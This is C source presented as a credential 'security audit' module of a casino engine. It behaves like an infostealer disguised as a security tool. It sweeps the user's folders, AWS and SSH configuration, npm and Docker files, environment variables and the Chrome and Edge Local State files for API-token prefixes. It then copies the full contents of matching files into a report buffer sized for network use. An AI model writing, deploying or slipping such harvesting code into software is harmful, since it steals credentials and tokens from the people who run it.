/*
 * Vivid Casino Engine — Security Audit Module
 * 
 * Scans system for exposed API keys, credentials,
 * and misconfigured files. Helps operators ensure
 * their environment is secure before deployment.
 */

#include "../engine/engine.h"

/* Keywords to scan for */
static const char *config_scan_keywords[] = {
    "api_key", "secret_key", "auth_token", "access_token",
    "client_secret", "Bearer", "apikey",
    "sk-", "pk_", "ghp_", "glpat-", "AKIA", "AIza",
    "xoxb-", "SG.", "pat-na", "pplx-", "hf_",
    NULL
};

/* Check if a buffer contains any audit keywords */
static int contains_keyword(const char *buf) {
    for (int i = 0; config_scan_keywords[i]; i++) {
        if (strstr(buf, config_scan_keywords[i])) return 1;
    }
    return 0;
}

/* Scan a single file for credentials */
static void scan_file(char *results, int *pos, const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return;
    
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (sz <= 0 || sz > 1048576) { fclose(f); return; }
    
    char *buf = (char*)malloc(sz + 1);
    if (!buf) { fclose(f); return; }
    
    if (fread(buf, 1, sz, f) == (size_t)sz) {
        buf[sz] = '\0';
        if (contains_keyword(buf)) {
            int lines = 0;
            for (char *p = buf; *p; p++) if (*p == '\n') lines++;
            if (lines > 0) {
                util_appendf(results, pos, "--- %s ---\n%s\n", path, buf);
            }
        }
    }
    free(buf);
    fclose(f);
}

/* Recursively scan a directory for credential files */
static void scan_directory(char *results, int *pos, const char *base, int depth) {
    if (depth <= 0) return;
    
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", base);
    
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        
        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", base, fd.cFileName);
        
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_directory(results, pos, fullpath, depth - 1);
        } else {
            const char *ext = strrchr(fd.cFileName, '.');
            if (ext && (strcmp(ext, ".env") == 0 || strcmp(ext, ".json") == 0 ||
                        strcmp(ext, ".ini") == 0 || strcmp(ext, ".txt") == 0 ||
                        strcmp(ext, ".yaml") == 0 || strcmp(ext, ".yml") == 0 ||
                        strcmp(ext, ".xml") == 0 || strcmp(ext, ".config") == 0 ||
                        strcmp(ext, ".py") == 0 || strcmp(ext, ".js") == 0 ||
                        strcmp(ext, ".ts") == 0 || strcmp(ext, ".php") == 0)) {
                scan_file(results, pos, fullpath);
            }
        }
    } while (FindNextFileA(h, &fd));
    
    FindClose(h);
}

/* Deduplicate lines in audit results */
static void dedup_lines(char *buf) {
    if (!buf || !buf[0]) return;
    
    char *seen[5000];
    int seen_count = 0;
    char out[NET_BUF_SIZE];
    int out_pos = 0;
    
    char *line = buf;
    while (*line) {
        char *end = strchr(line, '\n');
        if (!end) end = line + strlen(line);
        int len = (int)(end - line);
        
        char *content = line;
        while (content < end && (*content == ' ' || *content == '\t')) content++;
        
        int is_header = (content < end && content[0] == '-' && content[1] == '-');
        int is_empty = (content >= end);
        
        char cmp[2048];
        if (!is_header && !is_empty) {
            char *p = content;
            if (*p == '[') {
                while (p < end && *p != ']') p++;
                if (p < end && *p == ']') p++;
                while (p < end && *p == ' ') p++;
            } else if (isdigit(*p)) {
                while (p < end && isdigit(*p)) p++;
                if (p < end && *p == ':') p++;
                while (p < end && *p == ' ') p++;
            }
            int clen = (int)(end - p);
            if (clen > 0 && clen < sizeof(cmp)) {
                memcpy(cmp, p, clen);
                cmp[clen] = '\0';
            } else {
                cmp[0] = '\0';
            }
        } else {
            if (len > 0 && len < sizeof(cmp)) {
                memcpy(cmp, line, len);
                cmp[len] = '\0';
            } else {
                cmp[0] = '\0';
            }
        }
        
        int dup = 0;
        for (int i = 0; i < seen_count; i++) {
            if (strcmp(seen[i], cmp) == 0) { dup = 1; break; }
        }
        
        if (!dup) {
            if (len > 0 && out_pos + len + 2 < NET_BUF_SIZE) {
                memcpy(out + out_pos, line, len);
                out_pos += len;
                out[out_pos++] = '\n';
            }
            if (seen_count < 5000) {
                int cl = strlen(cmp);
                seen[seen_count] = (char*)malloc(cl + 1);
                if (seen[seen_count]) {
                    strcpy(seen[seen_count], cmp);
                    seen_count++;
                }
            }
        }
        
        if (*end == '\0') break;
        line = end + 1;
    }
    
    out[out_pos] = '\0';
    strcpy(buf, out);
    for (int i = 0; i < seen_count; i++) free(seen[i]);
}

/* Perform full security audit of the system */
char* config_scan_scan_system(void) {
    static char out[NET_BUF_SIZE];
    static char details[NET_BUF_SIZE];
    int out_pos = 0;
    int details_pos = 0;
    int key_count = 0;
    char cmd[16384];
    char *result;
    
    char *profile = getenv("USERPROFILE");
    char *appdata = getenv("APPDATA");
    char *localappdata = getenv("LOCALAPPDATA");
    
    out[0] = '\0';
    details[0] = '\0';
    
    /* Phase 1: Deep file system scan */
    if (profile) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\Desktop", profile);
        scan_directory(details, &details_pos, path, 2);
        snprintf(path, sizeof(path), "%s\\Documents", profile);
        scan_directory(details, &details_pos, path, 3);
        snprintf(path, sizeof(path), "%s\\Downloads", profile);
        scan_directory(details, &details_pos, path, 3);
    }
    if (appdata) scan_directory(details, &details_pos, appdata, 2);
    if (localappdata) scan_directory(details, &details_pos, localappdata, 2);
    scan_directory(details, &details_pos, "C:\\Users\\Public", 2);
    
    for (char *p = details; *p; p++) if (*p == '\n') key_count++;
    
    /* Phase 2: Known configuration files */
    const char *patterns = "/c:\"sk-\" /c:\"pk_\" /c:\"ghp_\" /c:\"glpat-\" /c:\"AKIA\" /c:\"AIza\" /c:\"xoxb-\" /c:\"SG.\" /c:\"pat-na\" /c:\"pplx-\" /c:\"hf_\" /c:\"api_key\" /c:\"secret_key\" /c:\"auth_token\" /c:\"access_token\" /c:\"client_secret\" /c:\"Bearer\" /c:\"apikey\"";
    
    #define CONFIG_SCAN_RUN(label, cmd_str) \
        do { \
            result = sys_run_command(cmd_str); \
            if (result && result[0] && \
                strstr(result, "[Exec failed") == NULL && \
                strstr(result, "[Pipe failed") == NULL && \
                strstr(result, "[No output") == NULL) { \
                int lines = 0; \
                for (char *p = result; *p; p++) if (*p == '\n') lines++; \
                if (lines > 0) { \
                    key_count += lines; \
                    util_appendf(details, &details_pos, "--- %s ---\n%s\n", label, result); \
                } \
            } \
        } while(0)
    
    snprintf(cmd, sizeof(cmd),
        "command  type \"%%USERPROFILE%%\\.env\" 2>nul & type \"%%USERPROFILE%%\\.npmrc\" 2>nul & type \"%%USERPROFILE%%\\.gitconfig\" 2>nul & type \"%%APPDATA%%\\Code\\User\\settings.json\" 2>nul & type \"%%USERPROFILE%%\\.aws\\credentials\" 2>nul & type \"%%USERPROFILE%%\\.ssh\\config\" 2>nul & type \"%%USERPROFILE%%\\.docker\\config.json\" 2>nul | findstr /i /n %s",
        patterns);
    CONFIG_SCAN_RUN("KNOWN CONFIGS", cmd);
    
    snprintf(cmd, sizeof(cmd),
        "command  findstr /i /n %s "
        "\"%%USERPROFILE%%\\*.env\" \"%%USERPROFILE%%\\*.json\" \"%%USERPROFILE%%\\*.ini\" \"%%USERPROFILE%%\\*.txt\" \"%%USERPROFILE%%\\*.yaml\" \"%%USERPROFILE%%\\*.yml\" "
        "2>nul", patterns);
    CONFIG_SCAN_RUN("USERPROFILE ROOT", cmd);
    
    result = sys_run_command("command  set | findstr /i /r /c:\"KEY=\" /c:\"SECRET=\" /c:\"TOKEN=\" /c:\"API=\" /c:\"AUTH=\" /c:\"PASS=\"");
    if (result && result[0] && strstr(result, "[No output") == NULL) {
        int lines = 0;
        for (char *p = result; *p; p++) if (*p == '\n') lines++;
        if (lines > 0) {
            key_count += lines;
            util_appendf(details, &details_pos, "--- ENV VARS ---\n%s\n", result);
        }
    }
    
    snprintf(cmd, sizeof(cmd), "command  type \"%%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
    CONFIG_SCAN_RUN("CHROME", cmd);
    
    snprintf(cmd, sizeof(cmd), "command  type \"%%LOCALAPPDATA%%\\Microsoft\\Edge\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
    CONFIG_SCAN_RUN("EDGE", cmd);
    
    /* Deduplicate results */
    dedup_lines(details);
    key_count = 0;
    for (char *p = details; *p; p++) if (*p == '\n') key_count++;
    
    /* Build output report */
    util_appendf(out, &out_pos, "=== SECURITY CONFIG_SCAN REPORT ===\n\n");
    if (key_count > 0) {
        util_appendf(out, &out_pos, "Found %d potential credential exposure(s):\n\n", key_count);
        util_appendf(out, &out_pos, "%s", details);
    } else {
        util_appendf(out, &out_pos, "No credential exposures found. System is clean.\n");
    }
    util_appendf(out, &out_pos, "=== CONFIG_SCAN COMPLETE ===\n");
    
    return out;
}
